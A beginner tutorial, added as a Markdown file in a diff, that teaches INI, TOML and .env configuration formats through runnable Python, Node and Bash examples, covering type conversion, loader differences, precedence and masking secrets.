@@ -1,0 +1,977 @@
+---
+title: "TOML, INI and .env Files"
+summary: "From zero: why programs read settings from config files, the INI format (sections, keys, comments) and where you still meet it (.gitconfig, php.ini, my.cnf, AWS credentials, systemd units), why everything in INI is a string, defaults and interpolation and the % trap, TOML with real types, tables, nested tables and arrays of tables as used in pyproject.toml and Cargo.toml, .env files and how different loaders (python-dotenv, Node, Bash, Docker Compose) read them differently, which value wins when the same setting is in two places, choosing a format, and config injection and secret-handling risks."
+level: beginner
+minutes: 35
+prerequisites: ["YAML", "Environment Variables and the PATH"]
+tags: ["Data Formats", "DevOps"]
+---
+
+<Callout type="tip" title="In one minute">
+Programs read their **settings** from simple text files so you can change behaviour **without changing code**. Three small formats are everywhere. **INI**: `[section]` headers with `key = value` lines; very old and simple, **every value is a string**, and the details differ between programs. You see it in `.gitconfig`, `php.ini`, `my.cnf`, `~/.aws/credentials` and systemd units. **TOML**: looks like INI but has a **real specification and real types** (strings must be quoted; numbers, booleans, dates, arrays and nested tables are typed). It's used by `pyproject.toml`, `Cargo.toml`, Hugo and Netlify. **`.env`**: plain `NAME=value` lines loaded into **environment variables**, mainly for secrets and per-machine settings. It's never committed, and **each loader parses it slightly differently**. Real environment variables usually **override** `.env`.
+</Callout>
+
+## Start from zero
+
+<Callout type="analogy">
+Think of a **TV remote's settings menu** versus the **TV's electronics**. The electronics (the code) are the same in every house; the settings menu (the config file) is what each family adjusts: language, volume limit, channel list. **INI** is like a handwritten list of settings grouped under headings ("Picture", "Sound"): easy, but everything is just words, and each TV brand reads the list a bit differently. **TOML** is the same idea with a printed form that says exactly what kind of value each box takes (number, yes/no, date). A **`.env` file** is the **sticky note with the Wi-Fi password** next to the TV: specific to this house, private, and never photocopied into the instruction manual (Git).
+</Callout>
+
+### Words you need first
+
+| Word | Simple meaning | Example |
+| --- | --- | --- |
+| **Configuration (config)** | Settings that change how a program behaves | port, database host, log level |
+| **Section / table** | A named group of settings | `[database]` |
+| **Key–value pair** | A setting's name and its value | `port = 5432` |
+| **Typed value** | A value that knows whether it's a number, boolean, string… | TOML `port = 5432` is an integer |
+| **Interpolation** | Building a value from other values | `url = %(host)s:%(port)s` |
+| **Environment variable** | A named value the OS passes to a running program | `PORT=3000` |
+| **`.env` file** | A file of `NAME=value` lines loaded into environment variables | `DB_PASSWORD=...` |
+| **Precedence** | Which value wins if a setting is defined in two places | real env var beats `.env` |
+| **Spec (specification)** | The official rules of a format | toml.io v1.0.0 |
+
+## What is it?
+
+The same settings in all three formats:
+
+```ini
+; settings.ini (INI)
+[server]
+host = 0.0.0.0
+port = 8080
+debug = false
+
+[database]
+url = postgres://db.internal:5432/shop
+```
+
+```toml
+# settings.toml (TOML)
+[server]
+host = "0.0.0.0"
+port = 8080
+debug = false
+
+[database]
+url = "postgres://db.internal:5432/shop"
+```
+
+```bash
+# .env (flat NAME=value; no sections)
+SERVER_HOST=0.0.0.0
+SERVER_PORT=8080
+DEBUG=false
+DATABASE_URL=postgres://db.internal:5432/shop
+```
+
+They look similar, but INI gives the program the **string** `"8080"`, TOML gives the **integer** `8080`, and `.env` puts the string `"8080"` into the process environment.
+
+## Why does it matter?
+
+- **The Twelve-Factor App rule:** keep config out of code, so the same build runs in development, staging and production with different settings.
+- **You will edit these files constantly:** `.gitconfig`, `~/.aws/credentials`, `php.ini`, `my.cnf`, `pyproject.toml`, `.env`, `.npmrc`, systemd `.service` files.
+- **Small format details cause real bugs:** a `%` in an INI password crashes Python apps, a space in a `.env` value breaks Bash scripts, a missing quote breaks a TOML file.
+- **Security:** `.env` and credential files hold the keys to your systems. Where they live, who can read them, and whether they reach Git matters a lot.
+
+## When and where do you use it?
+
+| Format | Typical files | Choose it when |
+| --- | --- | --- |
+| INI | `.gitconfig`, `php.ini`, `my.cnf`, `~/.aws/config` and `credentials`, `setup.cfg`, `tox.ini`, systemd units, Windows `.ini` | The tool you use expects it (you rarely choose INI for new projects) |
+| TOML | `pyproject.toml`, `Cargo.toml`, `netlify.toml`, Hugo `hugo.toml`, `uv.toml`, Poetry, Ruff, Black | New config files that humans edit and that need types and nesting, without YAML's surprises |
+| `.env` | Project root of Node, Python, PHP (Laravel), Docker Compose apps | Secrets and per-machine values loaded as environment variables |
+| YAML / JSON | Kubernetes, CI, APIs | See the previous lessons |
+
+## Concepts one by one
+
+### 1. INI: sections, keys and comments
+
+<Explain>
+<What>
+An INI file has **sections** in square brackets, and under each one `key = value` (or `key: value`) lines. Lines starting with `;` or `#` are comments.
+</What>
+<Why>
+It's the simplest possible grouped config, readable by anyone, and it has existed since early Windows and Unix tools.
+</Why>
+<When>
+Whenever a tool uses it: Git, PHP, MySQL, the AWS CLI, Python packaging tools, systemd.
+</When>
+<Where>
+Python reads INI with the built-in `configparser` module; PHP has `parse_ini_file`; Node has the `ini` package.
+</Where>
+<How>
+There's **no single official standard**. Each program decides details like comment characters, case sensitivity, quotes and duplicate keys. Always check the tool's documentation.
+</How>
+</Explain>
+
+```bash
+cat > shop.ini <<'EOF'
+; Shop API settings
+[server]
+host = 0.0.0.0
+port = 8080
+debug = no
+
+[database]
+Host = db.internal
+port = 5432
+name = shop
+EOF
+python3 - <<'PY'
+import configparser
+config = configparser.ConfigParser()
+config.read("shop.ini")
+print("sections:", config.sections())
+for section in config.sections():
+    for key, value in config[section].items():
+        print(f"  [{section}] {key} = {value!r}")
+PY
+```
+
+```text output
+sections: ['server', 'database']
+  [server] host = '0.0.0.0'
+  [server] port = '8080'
+  [server] debug = 'no'
+  [database] host = 'db.internal'
+  [database] port = '5432'
+  [database] name = 'shop'
+```
+
+Line by line:
+
+- The file has a comment (`;`), two sections, and three keys in each.
+- `configparser.ConfigParser()` creates a parser, and `config.read("shop.ini")` loads the file.
+- `config.sections()` lists section names in file order.
+- `config[section].items()` gives each key and value. `!r` prints values with quotes, so we can see their type.
+- Two surprises: **every value is a string** (`'8080'`, `'no'`), and `Host` became `host`, because Python's configparser makes keys **lower-case** by default.
+
+### 2. INI values are strings: converting types
+
+<Explain>
+<What>
+INI has no types. Your program decides how to interpret each value.
+</What>
+<Why>
+`'8080'` is text: `'8080' + 1` is an error in Python, and `'no'` is a non-empty string, which counts as **true** in an `if`.
+</Why>
+<When>
+Every time you read a number or a yes/no setting from INI.
+</When>
+<Where>
+configparser has helpers: `getint`, `getfloat` and `getboolean`, which accepts `1/yes/true/on` and `0/no/false/off` in any case.
+</Where>
+<How>
+Give defaults with `fallback=` so a missing key doesn't crash the program.
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import configparser
+config = configparser.ConfigParser()
+config.read("shop.ini")
+server = config["server"]
+print("raw debug:", repr(server["debug"]), "-> if-test says", bool(server["debug"]))
+print("getboolean:", server.getboolean("debug"))
+print("getint + 1:", server.getint("port") + 1)
+print("missing key with fallback:", server.getint("workers", fallback=4))
+PY
+```
+
+```text output
+raw debug: 'no' -> if-test says True
+getboolean: False
+getint + 1: 8081
+missing key with fallback: 4
+```
+
+Line by line:
+
+- `bool(server["debug"])` checks the raw string `'no'`. Any non-empty string is "truthy" in Python, so it says **True**: debug mode would be **on** in production. A classic bug.
+- `getboolean("debug")` understands `no` and correctly returns `False`.
+- `getint("port")` converts `'8080'` to the integer 8080, so `+ 1` works.
+- `getint("workers", fallback=4)` returns 4 because the key doesn't exist.
+
+### 3. INI defaults and interpolation, and the `%` trap
+
+<Explain>
+<What>
+configparser's special `[DEFAULT]` section provides values for **every** section. **Interpolation** lets a value include another value with `%(name)s`.
+</What>
+<Why>
+Avoid repeating shared values like a base directory or host.
+</Why>
+<When>
+Paths built from a base folder, URLs built from host and port.
+</When>
+<Where>
+Python's `ConfigParser` (interpolation is on by default). Other tools use other syntaxes, or none.
+</Where>
+<How>
+Because `%` is special, a literal `%` must be written `%%`. A password like `abc%123` makes Python raise an error. Use `RawConfigParser` (no interpolation) for files with secrets or user data.
+</How>
+</Explain>
+
+```bash
+cat > paths.ini <<'EOF'
+[DEFAULT]
+base_dir = /srv/shop
+
+[logging]
+file = %(base_dir)s/logs/app.log
+
+[uploads]
+dir = %(base_dir)s/uploads
+
+[secrets]
+db_password = abc%123
+EOF
+python3 - <<'PY'
+import configparser
+config = configparser.ConfigParser()
+config.read("paths.ini")
+print("log file:   ", config["logging"]["file"])
+print("uploads dir:", config["uploads"]["dir"])
+try:
+    print(config["secrets"]["db_password"])
+except configparser.InterpolationSyntaxError as err:
+    print("ERROR:      ", str(err).splitlines()[0])
+raw = configparser.RawConfigParser()
+raw.read("paths.ini")
+print("raw parser: ", raw["secrets"]["db_password"])
+PY
+```
+
+```text output
+log file:    /srv/shop/logs/app.log
+uploads dir: /srv/shop/uploads
+ERROR:       '%' must be followed by '%' or '(', found: '%123'
+raw parser:  abc%123
+```
+
+Line by line:
+
+- `base_dir` in `[DEFAULT]` is visible in every section.
+- `%(base_dir)s` is replaced by its value: `/srv/shop/logs/app.log`. The `s` at the end means "as a string".
+- The password `abc%123` contains a `%` not followed by `(` or `%`, so reading it raises `InterpolationSyntaxError`. In a real app, that means it crashes at startup with a confusing error.
+- `RawConfigParser` turns interpolation off and returns the password exactly as written.
+
+### 4. INI in tools you already use
+
+<Explain>
+<What>
+Many everyday tools store their settings in INI-style files, each with small variations.
+</What>
+<Why>
+Knowing the format lets you read and fix these files confidently, and diagnose problems.
+</Why>
+<When>
+Configuring Git, the AWS CLI, PHP, MySQL, systemd services.
+</When>
+<Where>
+`~/.gitconfig` and `.git/config`, `~/.aws/config` and `~/.aws/credentials`, `/etc/php/*/php.ini`, `/etc/mysql/my.cnf`, `/etc/systemd/system/*.service`.
+</Where>
+<How>
+Prefer the tool's own command to edit its file (`git config`, `aws configure`, `systemctl edit`). It writes valid syntax for you.
+</How>
+</Explain>
+
+```bash
+git config -f demo.gitconfig user.name "Moiz Rehman"
+git config -f demo.gitconfig core.editor "code --wait"
+git config -f demo.gitconfig remote.origin.url https://github.com/acme/shop.git
+cat demo.gitconfig
+echo "--- read one value back:"
+git config -f demo.gitconfig --get remote.origin.url
+```
+
+```text output
+[user]
+	name = Moiz Rehman
+[core]
+	editor = code --wait
+[remote "origin"]
+	url = https://github.com/acme/shop.git
+--- read one value back:
+https://github.com/acme/shop.git
+```
+
+Line by line:
+
+- `git config -f demo.gitconfig KEY VALUE` writes to a specific file instead of your real config.
+- `user.name` means section `[user]`, key `name`. Git creates the section if it doesn't exist and indents keys with a tab.
+- `remote.origin.url` becomes a **subsection**: `[remote "origin"]`, a Git-specific extension to INI.
+- `--get` reads one value back.
+
+Other INI-style files you'll meet:
+
+```ini
+# ~/.aws/credentials   (secret! permissions should be 600)
+[default]
+aws_access_key_id = AKIA................
+aws_secret_access_key = ........................................
+
+[client-prod]
+aws_access_key_id = AKIA................
+aws_secret_access_key = ........................................
+```
+
+```ini
+# /etc/systemd/system/shop-api.service
+[Unit]
+Description=Shop API
+After=network-online.target
+
+[Service]
+User=shop
+EnvironmentFile=/etc/shop/api.env
+ExecStart=/usr/bin/node /srv/shop/server.js
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+
+systemd uses `Key=Value` with no spaces, and `EnvironmentFile=` loads a `.env`-style file: the formats meet.
+
+### 5. TOML: INI with real types
+
+<Explain>
+<What>
+TOML ("Tom's Obvious, Minimal Language") keeps INI's look but has a **precise specification** (v1.0.0) and **typed values**: strings (always quoted), integers, floats, booleans, dates and times, arrays and tables.
+</What>
+<Why>
+No guessing (unlike YAML) and no "everything is a string" (unlike INI). Every TOML parser in every language reads a file the same way.
+</Why>
+<When>
+New configuration files edited by humans, especially in Python, Rust and Go projects.
+</When>
+<Where>
+Python 3.11+ has `tomllib` built in (read-only); Node and Go have libraries; `pyproject.toml` and `Cargo.toml` are TOML.
+</Where>
+<How>
+Comments start with `#`. **Strings must be quoted**: an unquoted word is an error, not a string. Keys are case-sensitive.
+</How>
+</Explain>
+
+```bash
+cat > app.toml <<'EOF'
+# Shop API configuration
+name = "shop-api"
+version = "1.10"            # quoted, so it stays a string
+port = 8080
+timeout_seconds = 2.5
+debug = false
+country = "NO"              # no Norway problem: strings are always quoted
+allowed_hosts = ["shop.example.com", "api.example.com"]
+maintenance_window = 2026-11-15T02:00:00+05:00
+EOF
+python3 - <<'PY'
+import tomllib
+with open("app.toml", "rb") as f:
+    config = tomllib.load(f)
+for key, value in config.items():
+    print(f"{key:19} {type(value).__name__:9} {value!r}")
+PY
+```
+
+```text output
+name                str       'shop-api'
+version             str       '1.10'
+port                int       8080
+timeout_seconds     float     2.5
+debug               bool      False
+country             str       'NO'
+allowed_hosts       list      ['shop.example.com', 'api.example.com']
+maintenance_window  datetime  datetime.datetime(2026, 11, 15, 2, 0, tzinfo=datetime.timezone(datetime.timedelta(seconds=18000)))
+```
+
+Line by line:
+
+- `tomllib.load` needs the file opened in **binary** mode (`"rb"`). That's a rule of the module, because TOML is always UTF-8.
+- Every value arrives with the **type the file says**: `8080` is an `int`, `2.5` a `float`, `false` a `bool`, quoted values `str`, and `[...]` a `list`.
+- `version = "1.10"` and `country = "NO"` stay exactly as written. TOML never guesses.
+- `2026-11-15T02:00:00+05:00` is a real **datetime** with a timezone offset (+05:00 = 18000 seconds, Pakistan time). Dates are a native TOML type.
+
+### 6. TOML tables and nesting
+
+<Explain>
+<What>
+A **table** (`[name]`) is a group of keys, like an INI section. `[a.b]` creates a table nested inside `a`. **Dotted keys** (`a.b = 1`) and **inline tables** (`{ x = 1, y = 2 }`) are shorter ways to write the same nesting.
+</What>
+<Why>
+Real config is hierarchical: `database.primary.host`, `tool.ruff.lint`.
+</Why>
+<When>
+Grouping related settings, and tool sections in `pyproject.toml` (`[tool.black]`, `[tool.pytest.ini_options]`).
+</When>
+<Where>
+All three syntaxes produce the same data, so pick the one that reads best.
+</Where>
+<How>
+A table can only be declared **once**. Defining the same key twice is an error, not "last one wins".
+</How>
+</Explain>
+
+```bash
+cat > db.toml <<'EOF'
+[database]
+engine = "postgres"
+
+[database.primary]
+host = "db1.internal"
+port = 5432
+
+[database.replica]
+host = "db2.internal"
+port = 5432
+
+[cache]
+redis.host = "redis.internal"
+redis.port = 6379
+limits = { max_memory_mb = 512, eviction = "lru" }
+EOF
+python3 -c '
+import tomllib, json
+print(json.dumps(tomllib.load(open("db.toml", "rb")), indent=2))'
+```
+
+```text output
+{
+  "database": {
+    "engine": "postgres",
+    "primary": {
+      "host": "db1.internal",
+      "port": 5432
+    },
+    "replica": {
+      "host": "db2.internal",
+      "port": 5432
+    }
+  },
+  "cache": {
+    "redis": {
+      "host": "redis.internal",
+      "port": 6379
+    },
+    "limits": {
+      "max_memory_mb": 512,
+      "eviction": "lru"
+    }
+  }
+}
+```
+
+Line by line:
+
+- `[database]` creates a table; `[database.primary]` and `[database.replica]` create tables **inside** it.
+- Under `[cache]`, the dotted keys `redis.host` and `redis.port` create a nested `redis` table without a separate header.
+- `limits = { ... }` is an **inline table**: a small table on one line. Inline tables must stay on one line and can't be extended later.
+- Printing as JSON shows the exact nested structure. TOML maps perfectly onto JSON objects.
+
+### 7. Arrays of tables: `[[...]]`
+
+<Explain>
+<What>
+Double brackets `[[name]]` add **one more table to an array** named `name`. Each `[[name]]` header starts a new element.
+</What>
+<Why>
+Lists of similar items: servers, users, build targets, redirect rules.
+</Why>
+<When>
+Netlify `[[redirects]]`, Cargo `[[bin]]`, lists of backends or cron jobs.
+</When>
+<Where>
+In JSON terms it's an array of objects: `"redirects": [{...}, {...}]`.
+</Where>
+<How>
+Keys under a `[[name]]` header belong to that element until the next header.
+</How>
+</Explain>
+
+```bash
+cat > netlify.toml <<'EOF'
+[build]
+command = "npm run build"
+publish = "out"
+
+[[redirects]]
+from = "/docs/*"
+to = "/learn/:splat"
+status = 301
+
+[[redirects]]
+from = "/old-blog"
+to = "/blog"
+status = 302
+EOF
+python3 - <<'PY'
+import tomllib
+cfg = tomllib.load(open("netlify.toml", "rb"))
+print("build:", cfg["build"]["command"], "->", cfg["build"]["publish"])
+for r in cfg["redirects"]:
+    print(f"redirect {r['status']}: {r['from']} -> {r['to']}")
+PY
+```
+
+```text output
+build: npm run build -> out
+redirect 301: /docs/* -> /learn/:splat
+redirect 302: /old-blog -> /blog
+```
+
+Line by line:
+
+- `[build]` is a normal table with two keys.
+- Each `[[redirects]]` adds one element to the `redirects` array. Its three keys belong to that element.
+- In Python, `cfg["redirects"]` is a **list** of dictionaries, so we can loop over it.
+
+### 8. TOML is strict: errors you'll see
+
+<Explain>
+<What>
+TOML rejects anything not allowed by the spec, with a line and column.
+</What>
+<Why>
+Strictness means no silent surprises: either the file means exactly one thing, or it doesn't load.
+</Why>
+<When>
+Editing `pyproject.toml` or `Cargo.toml` by hand.
+</When>
+<Where>
+Errors come from the tool reading the file (pip, cargo, uv…) or from `python3 -c 'import tomllib; tomllib.load(open("f.toml","rb"))'`.
+</Where>
+<How>
+Most common: unquoted strings, duplicate keys or tables, leading zeros, and forgetting that inline tables must be on one line.
+</How>
+</Explain>
+
+```bash
+check() { printf '%b' "$2" | python3 -c '
+import sys, tomllib
+try:
+    tomllib.loads(sys.stdin.read()); print("valid")
+except tomllib.TOMLDecodeError as e:
+    print(e)' | sed "s/^/$1: /"; }
+check "good           " 'name = "shop"\nport = 8080\n'
+check "unquoted string" 'name = shop\n'
+check "duplicate key  " 'port = 80\nport = 8080\n'
+check "table twice    " '[server]\nport = 80\n[server]\nhost = "a"\n'
+check "leading zero   " 'port = 08080\n'
+```
+
+```text output
+good           : valid
+unquoted string: Invalid value (at line 1, column 8)
+duplicate key  : Cannot overwrite a value (at line 2, column 12)
+table twice    : Cannot declare ('server',) twice (at line 3, column 8)
+leading zero   : Expected newline or end of document after a statement (at line 1, column 9)
+```
+
+Line by line:
+
+- `check` passes the text to `tomllib.loads` and prints "valid" or the error message.
+- `name = shop` fails: in TOML, strings **must** be quoted (YAML and INI would accept it).
+- Setting `port` twice is an error, so there's no confusion about which value wins.
+- Declaring `[server]` twice is also an error. Put all `server` keys under one header.
+- `08080` fails because leading zeros aren't allowed in decimal integers (avoiding YAML's octal surprise).
+
+### 9. Reading a real `pyproject.toml`
+
+<Explain>
+<What>
+`pyproject.toml` is the standard configuration file for Python projects: name, version, dependencies, and settings for tools like pytest, Ruff and Black.
+</What>
+<Why>
+One file instead of `setup.py`, `setup.cfg`, `requirements.txt`, `pytest.ini`, `.flake8`…
+</Why>
+<When>
+Every modern Python project (pip, uv, Poetry, Hatch all read it).
+</When>
+<Where>
+Standard tables: `[project]` (PEP 621), `[build-system]`, and `[tool.<name>]` for each tool.
+</Where>
+<How>
+Tools read only their own `[tool.x]` table and ignore the rest.
+</How>
+</Explain>
+
+```bash
+cat > pyproject.toml <<'EOF'
+[project]
+name = "shop-api"
+version = "2.4.1"
+requires-python = ">=3.11"
+dependencies = [
+  "fastapi>=0.115",
+  "sqlalchemy>=2.0",
+]
+
+[project.optional-dependencies]
+dev = ["pytest", "ruff"]
+
+[tool.ruff]
+line-length = 100
+
+[tool.pytest.ini_options]
+testpaths = ["tests"]
+EOF
+python3 - <<'PY'
+import tomllib
+p = tomllib.load(open("pyproject.toml", "rb"))
+print(p["project"]["name"], p["project"]["version"])
+print("dependencies:", ", ".join(p["project"]["dependencies"]))
+print("dev extras:  ", p["project"]["optional-dependencies"]["dev"])
+print("tools configured:", sorted(p["tool"]))
+PY
+```
+
+```text output
+shop-api 2.4.1
+dependencies: fastapi>=0.115, sqlalchemy>=2.0
+dev extras:   ['pytest', 'ruff']
+tools configured: ['pytest', 'ruff']
+```
+
+Line by line:
+
+- `[project]` holds the package metadata; `dependencies` is an array that's allowed to span several lines, and a trailing comma after the last item is fine in TOML arrays.
+- `[project.optional-dependencies]` defines extras: `pip install "shop-api[dev]"` also installs pytest and Ruff.
+- `[tool.ruff]` and `[tool.pytest.ini_options]` belong to those tools. Our script lists which tools have settings, by reading the keys of the `tool` table.
+
+### 10. `.env` files: syntax and loading
+
+<Explain>
+<What>
+A `.env` file contains `NAME=value` lines (plus `#` comments). A **loader** reads it and puts the values into the program's **environment variables** at startup.
+</What>
+<Why>
+Code reads settings from the environment (`process.env.PORT`, `os.environ["PORT"]`), which works the same everywhere. On your laptop, `.env` provides them; in production, the platform does.
+</Why>
+<When>
+Local development, Docker Compose, small servers. Production platforms (Vercel, Kubernetes, systemd) usually set environment variables directly.
+</When>
+<Where>
+Python: `python-dotenv`. Node 20.6+: `node --env-file=.env app.js` (built in) or the `dotenv` package. Docker Compose: reads `.env` automatically for `${VAR}` substitution, and `env_file:` passes variables into containers. Laravel, Next.js and Vite load `.env` automatically.
+</Where>
+<How>
+All values are **strings**. Keep names UPPER_CASE with underscores, and keep `.env` out of Git (commit `.env.example` instead, see **Keeping Secrets Out of Git**).
+</How>
+</Explain>
+
+```bash
+cat > .env <<'EOF'
+# local development settings
+PORT=3000
+APP_NAME="Shop API"
+DATABASE_URL=postgres://shop:devpass@localhost:5432/shop
+FEATURE_CHECKOUT_V2=true
+EOF
+python3 -c '
+from dotenv import load_dotenv
+import os
+load_dotenv()
+print("python:", os.environ["APP_NAME"], "on port", os.environ["PORT"], "| type:", type(os.environ["PORT"]).__name__)'
+node --env-file=.env -e 'console.log("node:  ", process.env.APP_NAME, "on port", process.env.PORT, "| type:", typeof process.env.PORT)'
+```
+
+```text output
+python: Shop API on port 3000 | type: str
+node:   Shop API on port 3000 | type: string
+```
+
+Line by line:
+
+- The `.env` file has a comment and four variables. `APP_NAME` is quoted because it contains a space; the quotes are removed by the loader.
+- In Python, `load_dotenv()` finds `.env` in the current folder and copies its values into `os.environ`.
+- In Node, the `--env-file=.env` flag does the same before your code runs; no package needed.
+- Both see `PORT` as a **string** (`"3000"`), so convert it yourself: `int(os.environ["PORT"])`, `Number(process.env.PORT)`. Likewise, `FEATURE_CHECKOUT_V2` is the string `"true"`, not a boolean.
+
+### 11. Loaders disagree: the `.env` portability trap
+
+<Explain>
+<What>
+There's **no official `.env` standard**. python-dotenv, Node, Docker Compose, Bash's `source` and others parse quotes, spaces, `$VARIABLES`, `export` and comments differently.
+</What>
+<Why>
+A `.env` that works for your Node app may break a Bash deploy script, or a Compose file may expand `$` where Node doesn't.
+</Why>
+<When>
+When the same `.env` is used by several tools: app, scripts, Docker Compose, CI.
+</When>
+<Where>
+Safest subset: `NAME=value` with **no spaces around `=`**, **quote values containing spaces or `#`**, no multi-line values, and avoid `$` unless you know every loader's behaviour (write `$$` in Compose to mean a literal `$`).
+</Where>
+<How>
+Below, one file is loaded three ways and gives three different results.
+</How>
+</Explain>
+
+```bash
+export USER=moiz
+cat > tricky.env <<'EOF'
+FULL_NAME=Ali Raza
+SPACED = value
+GREETING="Hi ${USER}"
+EOF
+echo "--- python-dotenv:"
+python3 -c 'from dotenv import dotenv_values; [print(f"  {k}={v!r}") for k, v in dotenv_values("tricky.env").items()]'
+echo "--- node --env-file:"
+node --env-file=tricky.env -e 'for (const k of ["FULL_NAME", "SPACED", "GREETING"]) console.log(`  ${k}=${JSON.stringify(process.env[k])}`)'
+echo "--- bash 'source':"
+bash -c 'set -a; source ./tricky.env 2>errors.txt; set +a
+  sed "s#^.*tricky.env: #  error: #" errors.txt
+  for k in FULL_NAME SPACED GREETING; do echo "  $k=${!k-(not set)}"; done'
+```
+
+```text output
+--- python-dotenv:
+  FULL_NAME='Ali Raza'
+  SPACED='value'
+  GREETING='Hi moiz'
+--- node --env-file:
+  FULL_NAME="Ali Raza"
+  SPACED="value"
+  GREETING="Hi ${USER}"
+--- bash 'source':
+  error: line 1: Raza: command not found
+  error: line 2: SPACED: command not found
+  FULL_NAME=(not set)
+  SPACED=(not set)
+  GREETING=Hi moiz
+```
+
+Line by line:
+
+- `export USER=moiz` sets a variable that `${USER}` can refer to.
+- **python-dotenv** accepts the unquoted space, trims the spaces around `=`, and **expands** `${USER}` (it supports `${VAR}` with braces).
+- **Node** also accepts the first two lines but does **not** expand `${USER}`: the value is literally `Hi ${USER}`.
+- **Bash** reads the file as shell code: `FULL_NAME=Ali Raza` means "run the command `Raza` with `FULL_NAME=Ali` set temporarily" (error), and `SPACED = value` means "run the command `SPACED`" (error). Only `GREETING` works, and Bash expands `${USER}`.
+- `set -a` makes every variable assigned while sourcing exported automatically; `set +a` turns it off again. Errors go to `errors.txt` and are printed afterwards. (Piping `source` into another command would run it in a subshell, and the variables would be lost.) `${!k-(not set)}` reads the variable whose **name** is in `k`, with a default text if it doesn't exist.
+
+**Lesson:** write `.env` files in the safe subset (`FULL_NAME="Ali Raza"`, `SPACED=value`), and test them with every tool that reads them.
+
+### 12. Precedence: which value wins?
+
+<Explain>
+<What>
+When a setting exists in several places (code default, config file, `.env`, real environment variable, command-line flag), a fixed **precedence order** decides which value is used.
+</What>
+<Why>
+Production must be able to override development defaults without editing files. Confusion about precedence is a top cause of "but I changed the setting and nothing happened!".
+</Why>
+<When>
+Debugging config, deploying to new environments.
+</When>
+<Where>
+Common order, highest first: **command-line flag → real environment variable → `.env` → config file → default in code**. python-dotenv and Node's `--env-file` do **not** override variables that already exist (unless you ask with `override=True`).
+</Where>
+<How>
+Print the **effective** config at startup (without secrets) so you can see which values were used.
+</How>
+</Explain>
+
+```bash
+printf 'PORT=3000\nMODE=development\n' > .env
+echo "--- no real env var, so .env is used:"
+python3 -c 'from dotenv import load_dotenv; import os; load_dotenv(); print("  PORT =", os.environ["PORT"], "| MODE =", os.environ["MODE"])'
+echo "--- real env var PORT=8080 wins over .env:"
+PORT=8080 python3 -c 'from dotenv import load_dotenv; import os; load_dotenv(); print("  PORT =", os.environ["PORT"], "| MODE =", os.environ["MODE"])'
+PORT=8080 node --env-file=.env -e 'console.log("  node: PORT =", process.env.PORT)'
+echo "--- override=True makes .env win (rarely what you want):"
+PORT=8080 python3 -c 'from dotenv import load_dotenv; import os; load_dotenv(override=True); print("  PORT =", os.environ["PORT"])'
+```
+
+```text output
+--- no real env var, so .env is used:
+  PORT = 3000 | MODE = development
+--- real env var PORT=8080 wins over .env:
+  PORT = 8080 | MODE = development
+  node: PORT = 8080
+--- override=True makes .env win (rarely what you want):
+  PORT = 3000
+```
+
+Line by line:
+
+- Without a real `PORT` variable, both values come from `.env`.
+- `PORT=8080 python3 ...` sets a real environment variable for that one command. `load_dotenv()` sees `PORT` already exists and **keeps** it; `MODE` still comes from `.env`. Node behaves the same.
+- With `override=True`, `.env` replaces the real value. That's useful in rare cases, but it breaks the normal rule that the platform's environment wins.
+
+```text
+highest  ┌─────────────────────────────┐
+         │ command-line flag  --port   │
+         │ real environment variable   │  ← set by Docker, Kubernetes, CI, systemd
+         │ .env file                   │  ← local development
+         │ config file (TOML/INI/YAML) │
+lowest   │ default in the code         │
+         └─────────────────────────────┘
+```
+
+### 13. Choosing a format
+
+| | INI | TOML | `.env` | YAML | JSON |
+| --- | --- | --- | --- | --- | --- |
+| Official spec | No | Yes (v1.0.0) | No | Yes | Yes |
+| Types | Strings only | Real types | Strings only | Guessed | Real types |
+| Nesting | Sections only | Yes | No (flat) | Yes | Yes |
+| Comments | Yes | Yes | Yes | Yes | No |
+| Typical use | Legacy tool config | App/tool config | Secrets, per-machine env | DevOps manifests, CI | APIs, machine-written config |
+| Main trap | Program-specific rules, `%` | Must quote strings | Loaders differ, never commit | Indentation, type guessing | No comments, strict commas |
+
+## Hands-on
+
+Build a small, real config loader in Python: defaults in code, settings in TOML, secrets from `.env`, with environment variables overriding, and print the effective config with the secret masked.
+
+```bash
+cat > settings.toml <<'EOF'
+[server]
+host = "0.0.0.0"
+port = 8080
+workers = 4
+
+[database]
+host = "db.internal"
+name = "shop"
+EOF
+cat > .env <<'EOF'
+DB_PASSWORD="s3cr3t#pass"
+SERVER_WORKERS=2
+EOF
+cat > config.py <<'EOF'
+import os, tomllib
+from dotenv import load_dotenv
+
+DEFAULTS = {"server": {"host": "127.0.0.1", "port": 8000, "workers": 1, "debug": False}}
+
+def load_config():
+    load_dotenv()                                    # .env -> os.environ (real env vars win)
+    config = {s: dict(v) for s, v in DEFAULTS.items()}
+    with open("settings.toml", "rb") as f:           # TOML file overrides defaults
+        for section, values in tomllib.load(f).items():
+            config.setdefault(section, {}).update(values)
+    for section, values in config.items():           # SECTION_KEY env vars override TOML
+        for key, value in values.items():
+            env_value = os.environ.get(f"{section}_{key}".upper())
+            if env_value is not None:
+                values[key] = type(value)(env_value) if not isinstance(value, bool) else env_value.lower() == "true"
+    config["database"]["password"] = os.environ["DB_PASSWORD"]   # secrets only from the environment
+    return config
+
+def masked(config):
+    return {s: {k: ("****" if "password" in k else v) for k, v in vals.items()} for s, vals in config.items()}
+
+if __name__ == "__main__":
+    cfg = load_config()
+    for section, values in masked(cfg).items():
+        print(f"[{section}]", ", ".join(f"{k}={v!r}" for k, v in values.items()))
+    print("password length:", len(cfg["database"]["password"]))
+EOF
+echo "--- normal run:"; python3 config.py
+echo "--- production override via real env vars:"; SERVER_PORT=80 SERVER_DEBUG=true python3 config.py | head -1
+```
+
+```text output
+--- normal run:
+[server] host='0.0.0.0', port=8080, workers=2, debug=False
+[database] host='db.internal', name='shop', password='****'
+password length: 11
+--- production override via real env vars:
+[server] host='0.0.0.0', port=80, workers=2, debug=True
+```
+
+Line by line:
+
+- `settings.toml` holds normal, non-secret settings with real types, and it can be committed.
+- `.env` holds the secret password (quoted, because it contains `#`) and one override. It's ignored by Git.
+- `DEFAULTS` in the code gives safe values for everything.
+- `load_config()` applies the layers from lowest to highest: defaults → TOML → `SECTION_KEY` environment variables (from `.env` or the real environment). `type(value)(env_value)` converts the string from the environment into the same type as the default (e.g. `int("2")`); booleans are handled separately because `bool("false")` would be `True`.
+- The password is read **only** from the environment, never from the TOML file.
+- `masked()` replaces any key containing "password" with `****` before printing. Never print secrets, even at startup.
